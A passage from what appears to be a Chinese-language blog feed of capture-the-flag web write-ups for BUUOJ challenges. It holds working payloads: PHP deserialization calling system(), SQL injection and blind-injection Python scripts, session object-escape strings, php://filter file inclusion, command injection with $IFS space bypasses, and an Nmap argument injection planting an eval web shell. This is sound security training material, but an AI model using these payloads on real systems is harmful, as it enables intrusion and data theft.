&quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) {    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) {        return $result;    } else {return &quot;&quot;;}}class Test {    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() {        if ($this-&gt;func != &quot;&quot;) {            echo gettime($this-&gt;func, $this-&gt;p);        }    }}$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) {    $func = strtolower($func);    if (!in_array($func,$disable_fun)) {        echo gettime($func, $p);    }else {        die(&quot;Hacker...&quot;);    }}?&gt;</code></pre><p>即可看到题目源码。<br>审计代码可以感觉到本题很像反序列的题。而且本题只是对func进行了过滤，并没有对p进行过滤，所以想到把命令序列化后上传给p，func上传unserialize。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giyendbec7j30sh08rgm4.jpg" alt=""><br>构造payload:</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;} </code></pre><p>发现执行成功。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giyexwwomvj30sm08owf3.jpg" alt=""><br>经查找，在tmp发现带flag的文件，所以flag应该在这里。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giyf0bhmabj30tp08x74z.jpg" alt=""><br>从而获得flag。</p><h2 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h2><p>发现题目有robots.txt文件。给的提示是hint.txt。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giylby5hczj30og07idg2.jpg" alt=""><br>题目给了SQL语句的形式。<br>测试发现=和like都被过滤了。尝试payload:</p><pre><code>username=admin\&amp;password=1#</code></pre><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giyljizphzj30by0e6wfg.jpg" alt=""></p><p>页面发生变化。SQL语句变为:</p><pre><code>select * from users where username=&apos;admin\&apos; and password=&apos;or 1#&apos;;</code></pre><p>其中第二个’被\转义掉，所以admin后面的’会被认为是字符串，而不是将单引号括起来的单引号，所以成功绕过。<br>参考别人的二分脚本：</p><pre><code>import requestsurl = &quot;http://78fef60f-0aab-4f37-a6ad-f381989f1198.node3.buuoj.cn/index.php&quot;data = {&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}result = &quot;&quot;i = 0while( True ):i = i + 1 head=32tail=127while( head &lt; tail ):    mid = (head + tail) &gt;&gt; 1    payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;%(i,mid)    data[&apos;password&apos;] = payload    r = requests.post(url,data=data)    if &quot;stronger&quot; in r.text :        head = mid + 1    else:        tail = midlast = resultif head!=32:    result += chr(head)else:    breakprint(result)</code></pre><p><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giymjli9soj30c20h10tr.jpg" alt=""></p><p>最后跑出密码为：OhyOuFOuNdit，登录后获得flag。</p><p>参考：<a href="https://www.cnblogs.com/h3zh1/p/12669345.html" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/p/12669345.html</a></p><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><pre><code>&lt;?php$function = @$_GET[&apos;f&apos;];function filter($img){$filter_arr = array(&apos;php&apos;,&apos;flag&apos;,&apos;php5&apos;,&apos;php4&apos;,&apos;fl1g&apos;);$filter = &apos;/&apos;.implode(&apos;|&apos;,$filter_arr).&apos;/i&apos;;return preg_replace($filter,&apos;&apos;,$img);}if($_SESSION){unset($_SESSION);}$_SESSION[&quot;user&quot;] = &apos;guest&apos;;$_SESSION[&apos;function&apos;] = $function;extract($_POST);if(!$function){echo &apos;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&apos;;}if(!$_GET[&apos;img_path&apos;]){$_SESSION[&apos;img&apos;] = base64_encode(&apos;guest_img.png&apos;);}else{$_SESSION[&apos;img&apos;] = sha1(base64_encode($_GET[&apos;img_path&apos;]));}$serialize_info = filter(serialize($_SESSION));if($function == &apos;highlight_file&apos;){highlight_file(&apos;index.php&apos;);}else if($function == &apos;phpinfo&apos;){eval(&apos;phpinfo();&apos;); //maybe you can find something in here!}else if($function == &apos;show_image&apos;){$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo[&apos;img&apos;]));}</code></pre><p>implode:将一个一维数组的值转化为字符串。</p><p>unset() 函数用于销毁给定的变量。</p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giynaevdlyj30fd0cpdg8.jpg" alt=""></p><p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giynpqkjgvj30vd033aa0.jpg" alt=""><br>代码说能在phpinfo中找到一点东西，所以找了下，估计这就是flag的文件名。最后有一个file_get_contents函数，想着利用这个函数读取d0g3_f1ag.php，从这个函数逆推回去$userinfo[“img”]的值，发现值是可控的，但是会经过sha1加密，而题目并没有sha1解密，所以就不能读取文件。</p><p>本题考查的是php反序化的对象逃逸。</p><p>构造payload:</p><pre><code>_SESSION[phpflag]=;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizku2ihdlj30qe0hr401.jpg" alt=""></p><p>序列化后：</p><pre><code>a:2:{s:7:&quot;&quot;;s:54:&quot;;s:7:&quot;xxxxxxx&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}</code></pre><p>后面将多余的img截掉，前面”;s:54:为键，xxxxxxx为值，然后成功修改img的值为d0g3_f1ag.php，从而成功读取到php文件的内容。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gizld9243jj30qo0bhdh2.jpg" alt=""><br>发现flag在 <code>/d0g3_fllllllag</code>。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gizlo98fzfj30sn0by0ty.jpg" alt=""><br>接着构造payload:</p><pre><code>_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;}</code></pre><p>即可获得flag。</p><p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12261610.html</a></p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>从页面后面的 <code>?category=woofers</code>可以猜测本题为文件包含，尝试构造伪协议读取源码:</p><pre><code>?category=php://filter/convert.base64-encode/resource=index.php</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizn84y3p9j30kl03f74h.jpg" alt=""><br>根据错误可知包含文件时在index.php后面又加了.php，所以发生了错误。改为resource=index即可读出源码。<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1gizna7gs3aj30sn091755.jpg" alt=""></p><pre><code>&lt;?php            $file = $_GET[&apos;category&apos;];            if(isset($file))            {                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){                    include ($file . &apos;.php&apos;);                }                else{                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                }            }            ?&gt;</code></pre><p>从代码里可知，我们可以读取index.php，但是不能直接读取flag.php。</p><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giznl1bcdlj30bf02tweb.jpg" alt=""></p><p>使用 <code>?category=woofers/../flag</code>发现flag.php确实被包含了。<br>php://filter伪协议是可以套一层协议的，所以可以利用这一点来读取flag。<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giznoqyr04j31d10fqaby.jpg" alt=""><br>构造payload:</p><pre><code>?category=php://filter/convert.base64-encode/resource/index/resource=flag</code></pre><p>成功获得flag。</p><p>参考：<a href="https://blog.csdn.net/mochu7777777/article/details/105204141" target="_blank" rel="noopener">https://blog.csdn.net/mochu7777777/article/details/105204141</a></p><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1gizox6oeabj318h02o74f.jpg" alt=""><br>一进去，题目就提到了文件头。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gizoycq775j30cp02v3yh.jpg" alt=""><br>扫描发现有robots.txt文件。</p><pre><code>User-agent: *Disallow: /fAke_f1agggg.php</code></pre><p>robots.txt给出提示。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gizp0ve3xaj30q6072gmc.jpg" alt=""><br>抓包，在响应头上发现提示 <code>/fl4g.php</code>。<br>打开是乱码，使用charset修改编码为unicode即显示正常。</p><pre><code>&lt;?phpheader(&apos;Content-type:text/html;charset=utf-8&apos;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&apos;num&apos;])){$num = $_GET[&apos;num&apos;];if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;}else{die(&quot;金钱解决不了穷人的本质问题&quot;);}}else{die(&quot;去非洲吧&quot;);}//level 2if (isset($_GET[&apos;md5&apos;])){   $md5=$_GET[&apos;md5&apos;];   if ($md5==md5($md5))   echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;   else   die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);}else{die(&quot;去非洲吧&quot;);}//get flagif (isset($_GET[&apos;get_flag&apos;])){$get_flag = $_GET[&apos;get_flag&apos;];if(!strstr($get_flag,&quot; &quot;)){$get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;system($get_flag);}else{die(&quot;快到非洲了&quot;);}}else{die(&quot;去非洲吧&quot;);}?&gt;</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizps5raqkj30tz0ikdhb.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gizqpzaydaj30tw0ka76k.jpg" alt=""><br>输入1e10时inteval(‘1e10’)为1，inteval(‘1e10’+1)=1410065409成功绕过。</p><p>第二关需要输入的为0e开头并且md5加密后也是0e开头的md5值，找了一下，0e215962017符合条件。</p><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gizr682wdmj31cf0kntb1.jpg" alt=""><br>用ls命名看一下flag文件的名字，第三关过滤了cat，可以用tac，head，more绕过。过滤了空格，使用${IFS}$绕过，但是${IFS}$不行，所以使用$IFS$1绕过。<br>payload:</p><pre><code>?num=1e10&amp;md5=0e215962017&amp;get_flag=tac$IFS$1fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizrxx9e5cj31cd0kdaiy.jpg" alt=""><br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gizrypmmvhj318h0iv46z.jpg" alt=""><br>经测试发现注入点是在search.php中id的参数上。使用异或发现题目显示有区别，而且题目提示了SQL盲注。</p><p>盲注脚本：</p><pre><code>#然后是二分法，二分法要快很多：# -*- coding: UTF-8 -*-import reimport requestsimport stringurl = &quot;http://a7512037-44d3-449c-ae7f-54e751d21b0d.node3.buuoj.cn/search.php&quot;flag = &apos;&apos;def payload(i,j):# sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)#数据库名字  # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&apos;geek&apos;),%d,1))&gt;%d)^1&quot;%(i,j)   #表名# sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;F1naI1y&apos;)),%d,1))&gt;%d)^1&quot;%(i,j)#列名sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)data = {&quot;id&quot;:sql}r = requests.get(url,params=data)# print (r.url)if &quot;Click&quot; in r.text:res = 1else:res = 0return resdef exp():global flagfor i in range(1,10000) :print(i,&apos;:&apos;)low = 31high = 127while low &lt;= high :mid = (low + high) // 2res = payload(i,mid)if res :low = mid + 1else :high = mid - 1f = int((low + high + 1)) // 2if (f == 127 or f == 31):break# print (f)flag += chr(f)print(flag)exp()print(&apos;flag=&apos;,flag)</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gizsdimi7xj31go073jsn.jpg" alt=""><br>经过一段时间，就跑出了flag。</p><p>参考：<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1gizsn01vgrj30f50ah0st.jpg" alt=""><br>查看源码发现有一段代码，但是是前端验证，并没有什么用，而且md5也解不出来，但是发现有flag.php，访问一下。<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1gizss1xe9hj30qr0lkdkm.jpg" alt=""><br>题目说保存了购买者的IP，而且说除了购买者和我自己，没人能看到flag。<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1gizsu013zcj30wt0caq4a.jpg" alt=""><br>修改ip后获得flag。</p><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>和[BUUCTF 2018]Online Tool类似，就是构造 <code>&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code><br>scan后显示hacker，说明被检测出来了。经检查发现是过滤了php。<br>所以重新构造一下payload:</p><pre><code>&apos; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &apos;</code></pre><p>使用phtml绕过html检测。<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giztg15oemj31h207tjsa.jpg" alt=""><br>上传成功后就能访问该文件了。用蚁剑连接。<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giztgv77fgj30n808et98.jpg" alt=""><br>在根目录下发现flag。</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUOJ&quot;&gt;&lt;a href=&quot;#BUUOJ&quot; class=&quot;headerlink&quot; title=&quot;BUUOJ&quot;&gt;&lt;/a&gt;&lt;em&gt;BUUOJ&lt;/em&gt;&lt;/h1&gt;&lt;h2 id=&quot;HCTF-2018-WarmUp&quot;&gt;&lt;a href=&quot;#HCTF-2018-WarmUp
      
    
    </summary>
    
    
      <category term="web" scheme="https://devildragons.github.io/categories/web/"/>
    
    
      <category term="buuoj" scheme="https://devildragons.github.io/tags/buuoj/"/>
    
  </entry>
  
</feed>
